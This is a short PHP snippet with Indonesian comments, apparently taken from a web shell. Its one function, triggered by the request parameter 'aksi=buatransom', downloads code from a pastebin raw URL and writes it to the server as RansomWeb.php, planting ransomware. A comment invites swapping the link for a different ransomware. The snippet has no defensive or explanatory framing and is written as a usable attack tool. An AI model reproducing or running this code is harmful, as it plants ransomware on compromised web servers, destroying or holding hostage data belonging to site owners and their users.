<?php 
 if ($_GET['aksi'] == "buatransom") {
            // Ubah Link ransomnya jika ingin ganti ransomware yangvlain
            $url  = "https://pastebin.com/raw/LbVhNnZF";
            $curl = curl_init($url);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
            $get    = curl_exec($curl);

            if ($get != "") { // Jika isi file dari url tidak kosong
                // Buat file
                $puts = fopen("RansomWeb.php", "w");
                fwrite($puts, $get);
                fclose($puts);
                $nama_file  = "RansomWeb.php";
                $server_web = 'http://' . $_SERVER["HTTP_HOST"] . '/';
                if ($puts != "") {
                    echo "<script>window.location='?path=" . $path . "'; alert('Sukses')</script>";
                } else {
                    echo "Gagal Membuat File";
                }
            }
        }

?>
